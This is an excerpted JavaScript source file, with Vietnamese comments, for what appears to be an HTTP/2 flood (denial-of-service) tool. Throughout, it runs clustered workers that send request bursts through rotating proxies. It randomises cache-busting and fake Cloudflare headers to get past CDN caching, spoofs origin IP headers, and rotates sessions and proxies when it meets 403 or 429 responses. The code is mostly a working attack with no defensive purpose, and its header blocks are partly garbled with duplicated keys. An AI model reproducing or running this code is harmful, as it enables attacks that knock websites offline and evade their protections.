...
const RATE_LIMIT_THRESHOLD = 3; // Số lần rate limit trước khi đánh dấu proxy
const SESSION_ROTATE_REQUESTS = 35; // Số request trước khi rotate session
const PROXY_COOLDOWN = 45000; // Thời gian cooldown cho proxy (ms)
const REQUEST_DELAY_MIN = 50; // ms
const REQUEST_DELAY_MAX = 300; // ms
...
const controle_header = [
    ...
    'no-cache, no-store, private, s-maxage=0, must-revalidate',
    'no-store, no-cache, must-revalidate, proxy-revalidate',
    'public, no-cache, must-revalidate, proxy-revalidate',
    'no-cache, must-revalidate, proxy-revalidate, post-check=0, pre-check=0',
    'no-cache, no-store, must-revalidate, s-maxage=0',
    'no-cache, no-store, must-revalidate, s-maxage=1',
    'no-cache, no-store, must-revalidate, s-maxage=31535999',
    'no-cache, no-store, must-revalidate, s-maxage=31536001',
    'no-cache, no-store, must-revalidate, s-maxage=0, max-age=0',
    'no-cache, no-store, must-revalidate, s-maxage=0, max-stale=0',
    'no-cache, no-store, must-revalidate, s-maxage=0, min-fresh=31536000',
    'no-cache, no-store, must-revalidate, s-maxage=0, stale-while-revalidate=0',
    'no-cache, no-store, must-revalidate, s-maxage=0, stale-if-error=0',
    'no-cache, no-store, must-revalidate, s-maxage=0, max-age=0, proxy-revalidate, no-transform',
    'no-cache, no-store, must-revalidate, s-maxage=1, max-age=0, proxy-revalidate, no-transform',
    'no-cache, no-store, must-revalidate, s-maxage=31535999, max-age=0, proxy-revalidate, no-transform',
    'no-cache, no-store, must-revalidate, s-maxage=31536001, max-age=0, proxy-revalidate, no-transform',
    'no-cache, no-store, must-revalidate, s-maxage=0, max-age=0, proxy-revalidate, no-transform, stale-while-revalidate=0, stale-if-error=0',
    'no-cache, no-store, must-revalidate, s-maxage=0, max-age=0, proxy-revalidate, no-transform, max-stale=0, min-fresh=31536000'
];
...
if (cluster.isMaster) {
    ...
    setInterval(function() {
        flood();
    }, floodInterval + Math.floor(Math.random() * 100));
}

// Helper function để đóng kết nối khi nhận 403
function closeConnectionOn403(client, tlsSocket, socket, intervalId, workerId) {
    return function(response) {
        if (response[':status'] === 403) {
            console.log(`[Worker ${workerId}] Received 403 Forbidden, closing all connections`);
...
// Function để retry request với backoff khi gặp 403
async function makeRequestWithRetry(client, headers, maxRetries = 3) {
    let lastError;
    ...
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            ...
            if (error.message.includes('403')) {
                ...
                console.log(`Received 403, waiting ${backoffTime}ms before retry ${attempt}/${maxRetries}`);
...
function flood() {
    ...
    let headers = {
        ...
        'accept-language': Math.random() < 0.5 ? 'en-US,en;q=0.9' : 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'accept-encoding': 'gzip, deflate, br',
        'referer': parsed.protocol + '//' + parsed.host + '/',
        'cookie': process.argv[7],
        'cache-control': controle_header[Math.floor(Math.random() * controle_header.length)],
        'pragma': 'no-cache',
        ...(Math.random() < 0.3 ? { 'upgrade-insecure-requests': '1' } : {})
    };
    ...
    const allowedHeaders = [
        ...
        'referer', 'cookie', 'cache-control', 'pragma', 'upgrade-insecure-requests'
    ];
    
    Object.keys(headers).forEach(key => {
        if (headers[key] === undefined || !allowedHeaders.includes(key)) {
            delete headers[key];
        }
    });
    ...
    function createCustomTLSSocket(parsed, socket) {
        ...
        tlsSocket.setKeepAlive(true, 900000);
        tlsSocket.allowHalfOpen = true;
        tlsSocket.setNoDelay(true);
        tlsSocket.setMaxListeners(0);
        tlsSocket.setTimeout(900000);
        return tlsSocket;
    }
    ...
    connection.on('connect', function (res, socket) {
        ...
        socket.setKeepAlive(true, 900000);
        ...
        client.on('connect', () => {
            ...
            client._pingInterval = setInterval(() => {
                if (!client.destroyed) client.ping(() => {});
            }, 60000);
        });
        ...
        clients.forEach(client => {
            intervalId = setInterval(async () => {
                ...
                const head = {
                    ...
                    ...headers,
                    ...updatedHeaders,
                    ...cloudflareHeaders.generateCacheHeaders(),
                    'pragma': 'no-cache',
                    'cache-control': controle_header[Math.floor(Math.random() * controle_header.length)],
                ...
                // Tạo handle403 cho worker hiện tại
                const handle403 = closeConnectionOn403(client, tlsSocket, socket, intervalId, cluster.worker.id);
                ...
                for (let i = 0; i < rps; i++) {
                    ...
                    const requestPromise = new Promise((resolve, reject) => {
                        ...
                        req.on('response', response => {
                            // Kiểm tra 403 và đóng kết nối nếu có
                            if (handle403(response)) {
                                reject(new Error('403 Forbidden - Connection closed'));
                                return;
                            }
        ...
        client.on("error", error => {
            if (error.code === 'ERR_HTTP2_GOAWAY_SESSION') {
                ...
                console.log(`[Worker ${cluster.worker.id}] Received 403 error, closing connection\r`);
                client.destroy();
...
class Session {
    constructor(proxy) {
        ...
        this.cacheStrategy = {
            ...
            rotationInterval: Math.floor(Math.random() * (45000 - 30000)) + 30000,
            bypassAttempts: 0,
            maxBypassAttempts: 5
        };
        this.lastCacheStatus = null;
        this.forbiddenCount = 0; // Thêm counter cho 403
    }
    ...
    shouldRotateSession() {
        ...
        return this.requestCount >= SESSION_ROTATE_REQUESTS || 
               ...
               this.forbiddenCount >= 2; // Rotate session nếu nhận nhiều 403
    }
    ...
    updateStats(statusCode, path) {
        ...
        if (statusCode >= 200 && statusCode < 400) {
            ...
            this.forbiddenCount = Math.max(0, this.forbiddenCount - 1); // Giảm counter 403
        } else {
            this.failCount++;
            if (statusCode === 429) {
                this.rateLimitCount++;
    ...
    rotateCacheStrategy() {
        const now = Date.now();
        if (now - this.cacheStrategy.lastRotation >= this.cacheStrategy.rotationInterval) {
            this.cacheStrategy.bypassAttempts = 0;
            this.cacheStrategy.lastRotation = now;
            this.cacheStrategy.rotationInterval = Math.floor(Math.random() * (45000 - 30000)) + 30000;
            return true;
        }
        return false;
    }

    handleCacheStatus(headers) {
        const cacheStatus = headers['cf-cache-status'];
        if (cacheStatus === 'HIT') {
            this.cacheStrategy.bypassAttempts = this.cacheStrategy.maxBypassAttempts;
            this.rotateCacheStrategy();
        } else if (cacheStatus === 'MISS' || cacheStatus === 'BYPASS') {
            this.cacheStrategy.bypassAttempts = Math.max(0, this.cacheStrategy.bypassAttempts - 1);
        }
        this.lastCacheStatus = cacheStatus;
    }

    generateCacheBypassHeaders() {
        const now = Date.now();
        ...
        return {
            ...
            'Pragma': 'no-cache',
            'Expires': '0',
            'If-Modified-Since': new Date(now - 31536000000 - randomOffset).toUTCString(),
            'If-None-Match': `W/"${Math.random().toString(36).substr(2, 9)}"`,
            'X-Cache-Bypass': '1',
            ...
            'X-Forwarded-Server': parsed.host,
            'X-Forwarded-By': '127.0.0.1',
            'X-Requested-With': 'XMLHttpRequest',
            'X-HTTP-Method-Override': 'GET',
            'X-Original-Method': 'GET',
            'X-Original-URL': parsed.path,
            'X-Original-Host': parsed.host,
            'X-Original-Scheme': 'https',
            'X-Original-Port': '443',
            'X-Original-IP': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            'X-Original-User-Agent': process.argv[8],
            'X-Original-Referer': parsed.href,
            'X-Original-Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'X-Original-Accept-Encoding': 'gzip, deflate, br',
            'X-Original-Accept-Language': 'en-US,en;q=0.9',
            'X-Original-Connection': 'keep-alive',
            'X-Original-Cookie': process.argv[7],
            'X-Original-Authorization': `Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}`,
            'X-Original-Content-Type': 'application/x-www-form-urlencoded',
            'X-Original-Content-Length': '0',
            'X-Original-Transfer-Encoding': 'chunked',
            'X-Original-Expect': '100-continue',
            'X-Original-From': '',
            'X-Original-Host': parsed.host,
            'X-Original-If-Modified-Since': new Date(now - 31536000000 - randomOffset).toUTCString(),
            'X-Original-If-None-Match': `W/"${Math.random().toString(36).substr(2, 9)}"`,
            'X-Original-If-Unmodified-Since': new Date(now - 31536000000 - randomOffset).toUTCString(),
            'X-Original-If-Match': `W/"${Math.random().toString(36).substr(2, 9)}"`,
            'X-Original-If-Range': `W/"${Math.random().toString(36).substr(2, 9)}"`,
            'X-Original-Range': 'bytes=0-',
            'X-Original-Referer': parsed.href,
            'X-Original-User-Agent': process.argv[8],
            'X-Original-X-Requested-With': 'XMLHttpRequest',
            'X-Original-X-HTTP-Method-Override': 'GET',
            'X-Original-X-Original-Method': 'GET',
            'X-Original-X-Original-URL': parsed.path,
            'X-Original-X-Original-Host': parsed.host,
            'X-Original-X-Original-Scheme': 'https',
            'X-Original-X-Original-Port': '443',
            'X-Original-X-Original-IP': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            'X-Original-X-Original-User-Agent': process.argv[8],
            'X-Original-X-Original-Referer': parsed.href,
            'X-Original-X-Original-Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'X-Original-X-Original-Accept-Encoding': 'gzip, deflate, br',
            'X-Original-X-Original-Accept-Language': 'en-US,en;q=0.9',
            'X-Original-X-Original-Connection': 'keep-alive',
            'X-Original-X-Original-Cookie': process.argv[7],
            'X-Original-X-Original-Authorization': `Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}`,
            'X-Original-X-Original-Content-Type': 'application/x-www-form-urlencoded',
            'X-Original-X-Original-Content-Length': '0',
            'X-Original-X-Original-Transfer-Encoding': 'chunked',
            'X-Original-X-Original-Expect': '100-continue',
            'X-Original-X-Original-From': '',
            'X-Original-X-Original-Host': parsed.host,
            'X-Original-X-Original-If-Modified-Since': new Date(now - 31536000000 - randomOffset).toUTCString(),
            'X-Original-X-Original-If-None-Match': `W/"${Math.random().toString(36).substr(2, 9)}"`,
            'X-Original-X-Original-If-Unmodified-Since': new Date(now - 31536000000 - randomOffset).toUTCString(),
            'X-Original-X-Original-If-Match': `W/"${Math.random().toString(36).substr(2, 9)}"`,
            'X-Original-X-Original-If-Range': `W/"${Math.random().toString(36).substr(2, 9)}"`,
            'X-Original-X-Original-Range': 'bytes=0-',
            'X-Original-X-Original-Referer': parsed.href,
            'X-Original-X-Original-User-Agent': process.argv[8]
        };
    }
    ...
    getCacheHeaders() {
        ...
        if (this.cacheStrategy.bypassAttempts > 2) {
            Object.assign(headers, this.generateCacheBypassHeaders());
        } else {
            headers['Cache-Control'] = controle_header[Math.floor(Math.random() * controle_header.length)];
            if (Math.random() < 0.5) {
                headers['If-Modified-Since'] = new Date(now - Math.random() * 31536000000).toUTCString();
            }
            if (Math.random() < 0.5) {
                headers['If-None-Match'] = `W/"${Math.random().toString(36).substr(2, 9)}"`;
            }
        }
...
class RateLimitManager {
    ...
    updateProxyStatus(proxy, success, statusCode) {
        ...
        if (success) {
            ...
            status.forbiddenCount = Math.max(0, status.forbiddenCount - 1);
        } else {
            status.fail++;
            
            if (statusCode === 403) {
                status.forbiddenCount++;
                const banDuration = status.forbiddenCount >= 3 ? 300000 : 120000;
                status.bannedUntil = Date.now() + banDuration;
                this.activeProxies.delete(proxy);
                setTimeout(() => {
                    status.rateLimitCount = 0;
                    status.forbiddenCount = 0;
...
const cloudflareHeaders = {
    generateCacheHeaders() {
        const timestamp = Date.now();
        return {
            'CF-Cache-Status': ['DYNAMIC', 'BYPASS', 'MISS'][Math.floor(Math.random() * 3)],
            'CF-RAY': Math.random().toString(36).substring(2, 15) + '-' + ['LAX', 'DFW', 'EWR', 'SEA', 'IAD'][Math.floor(Math.random() * 5)],
            'CF-IPCountry': ['US', 'GB', 'DE', 'FR', 'JP'][Math.floor(Math.random() * 5)],
            'CDN-Cache-Control': controle_header[Math.floor(Math.random() * controle_header.length)],
            'Cache-Control': controle_header[Math.floor(Math.random() * controle_header.length)],
            'X-Cache': ['MISS', 'BYPASS'][Math.floor(Math.random() * 2)],
            'X-Cache-Status': ['MISS', 'BYPASS', 'EXPIRED'][Math.floor(Math.random() * 3)],
            'Age': '0',
            'X-Timer': 'S' + timestamp + '.' + Math.floor(Math.random() * 999999),
            'X-Cache-Hits': '0',
...
const cacheBypassStrategies = {
    aggressiveBypass() {
        ...
        return {
            ...
            'If-Modified-Since': new Date(now - 31536000000 - randomOffset).toUTCString(),
            'If-None-Match': `W/"${Math.random().toString(36).substr(2, 9)}"`,
            'If-Unmodified-Since': new Date(now - 31536000000 - randomOffset).toUTCString(),
            'If-Match': `W/"${Math.random().toString(36).substr(2, 9)}"`,
            'If-Range': `W/"${Math.random().toString(36).substr(2, 9)}"`,
            'Range': 'bytes=0-',
            'X-Cache-Bypass': '1',
            'X-Cache-Control': 'no-cache, no-store, must-revalidate',
            'X-Proxy-Cache': 'BYPASS',
